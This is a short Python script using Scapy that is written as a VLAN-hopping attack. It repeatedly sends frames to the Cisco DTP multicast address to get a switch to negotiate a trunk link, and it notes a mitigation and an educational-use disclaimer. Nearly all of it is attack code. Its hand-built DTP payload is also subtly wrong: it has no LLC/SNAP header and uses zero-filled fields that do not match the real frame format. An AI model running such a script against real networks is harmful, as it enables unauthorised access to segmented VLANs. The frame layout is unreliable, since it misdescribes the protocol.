#!/usr/bin/python3

from scapy.all import *
from scapy.layers.l2 import Ether


"""
This script tries to negotiate a trunk link with a switch by sending a DTP frame.
If the switch is configured to negotiate a trunk link, it will accept the DTP frame and establish a trunk link.
Thus giving the attacker access to all VLANs allowed on the trunk link.

Mitigation: To protect against DTP attacks, disable DTP negotiation on switch ports that do not require trunking.
Important: This script is for educational purposes only. Do not use it on networks you do not own or have permission to test.
"""
def negotiate_trunk(interface, src_mac, dst_mac="01:00:0c:cc:cc:cc"):
    # Create an Ethernet frame with the source and destination MAC addresses
    ether = Ether(src=src_mac, dst=dst_mac)

    # DTP payload to negotiate a trunk link
    dtp_payload = (
        b"\x01\x01\x00\x00"  # DTP header
        b"\x00\x00\x00\x00"  # Domain name
        b"\x00\x00\x00\x00"  # Version
        b"\x00\x00\x00\x00"  # Status
        b"\x00\x00\x00\x00"  # Type
        b"\x00\x00\x00\x00"  # Length
        b"\x00\x00\x00\x00"  # Value
    )

    # Combine the Ethernet frame and DTP payload
    packet = ether / Raw(load=dtp_payload)

    # Show the packet
    packet.show()

    # Send the packet
    sendp(packet, iface=interface, loop=1, inter=2)

if __name__ == "__main__":
    interface = "eth0"  # Replace with your network interface
    src_mac = "00:11:22:33:44:55"  # Replace with your source MAC address

    negotiate_trunk(interface, src_mac)